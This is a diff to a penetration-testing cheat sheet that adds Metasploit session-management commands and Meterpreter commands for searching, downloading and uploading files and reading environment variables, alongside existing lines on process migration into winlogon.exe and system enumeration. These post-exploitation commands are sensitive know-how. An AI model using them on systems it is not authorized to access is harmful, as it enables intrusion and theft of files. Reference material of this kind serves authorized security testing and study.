@@ -49,9 +49,12 @@ setg RHOSTS <ip>
 setg RHOST <ip>
 ```
 ```
+sessions -h
 sessions -l
 sessions -i <session_id>
 sessions -k <session_id>
+sessions -K
+sessions -C <command> -i <session_id>
 ```
 ```
 Hold Ctrl + M + L to clear screen
@@ -73,7 +76,15 @@ connect <ip> <port>
 [<< Index](#Index)
 ```
 meterpreter > help
+meterpreter > exit
 meterpreter > background (or Ctrl + Z)
+```
+```
+meterpreter > search -d /usr/bin -f *<keyword>*
+meterpreter > search -f *.<extension>
+
+meterpreter > download <filename>
+meterpreter > upload <filename>
 ```
 ```
 meterpreter > ps
@@ -790,6 +801,7 @@ meterpreter > migrate -N winlogon.exe
 ### Enumerating System Information
 ```
 meterpreter > sysinfo
+meterpreter > getenv PATH
 
 hostname
 cat /etc/issue && cat /etc/*release
